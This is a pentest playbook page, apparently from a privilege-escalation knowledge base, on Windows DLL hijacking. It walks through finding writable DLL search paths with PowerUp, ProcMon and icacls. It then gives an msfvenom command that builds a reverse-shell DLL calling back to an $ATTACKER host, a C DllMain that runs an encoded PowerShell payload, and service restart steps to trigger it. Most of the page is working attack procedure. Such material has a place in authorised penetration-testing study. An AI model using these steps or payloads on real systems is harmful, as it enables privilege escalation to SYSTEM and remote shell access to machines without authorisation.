---
id: windows-dll-hijack
title: DLL Hijacking
stage: privesc
tags: [windows]
summary: Plant a malicious DLL in a directory searched before the legitimate one — exploitable when a privileged process loads a DLL from a user-writable path or when a DLL is missing entirely.
leads_to:
  - system-shell
  - rev-shell
---

## Prerequisites

A low-privilege Windows shell. A privileged process (running as SYSTEM or Admin) that loads a DLL from a user-writable directory, or that searches for a DLL that doesn't exist. ProcMon (Sysinternals) to identify missing DLL loads. PowerUp for automated discovery.

DLL hijacking exploits Windows's DLL search order — the application directory is checked first, before System32. If a SYSTEM-level service binary lives in a directory you can write to, or if it calls a DLL by name that doesn't exist, you can drop your own DLL there and it runs under the process's identity. Phantom DLLs (missing ones) are the easiest — no need to forward exports.

## Quick Win

> Run PowerUp for automated detection — Find-DLLHijack catches the most common cases.

```powershell
. .\PowerUp.ps1
Find-DLLHijack
Find-PathDLLHijack
```

## Find with ProcMon (Most Thorough)

> Filter for NAME NOT FOUND + .dll to see exactly which DLLs are missing in writable locations.

```
Filter: Process Name → target process
Filter: Result → NAME NOT FOUND
Filter: Path → ends with .dll
```

Look for DLL loads that fail in a user-writable directory.

## Check Directory Write Permissions

> If the app directory or a PATH entry is writable, that's the hijack location.

```powershell
# Check app directory
icacls "C:\Program Files\VulnerableApp\"
# BUILTIN\Users:(W) = writable

# Check PATH entries for writable directories
$env:PATH -split ';' | ForEach-Object { icacls $_ 2>$null | Select-String "(W)" }
```

## Build the Malicious DLL

> msfvenom for a reverse shell, or a minimal C DLL for a targeted payload.

```bash
# Reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll
```

For apps that require the DLL to export specific functions (proxy DLL):

```c
// Compile: x86_64-w64-mingw32-gcc -shared -o target.dll proxy.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd /c powershell -enc BASE64_PAYLOAD");
    }
    return TRUE;
}
```

## Service DLL Hijacking

> Service running as SYSTEM loading a missing DLL from a writable path — place DLL, restart service.

```powershell
# Find services and their binary paths
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode, State

# Check if the binary's directory is writable
icacls (Split-Path -Parent "C:\Service\service.exe")
```

```bash
# Place DLL → restart service (if you have restart rights) or wait for reboot
sc stop ServiceName && sc start ServiceName
```

## Leads To

DLL loaded by SYSTEM process → reverse shell or SUID-equivalent payload as SYSTEM → system-shell. Place DLL in app directory → runs on next service restart or reboot. Phantom DLL is cleanest — no export forwarding needed, lower chance of app crash.
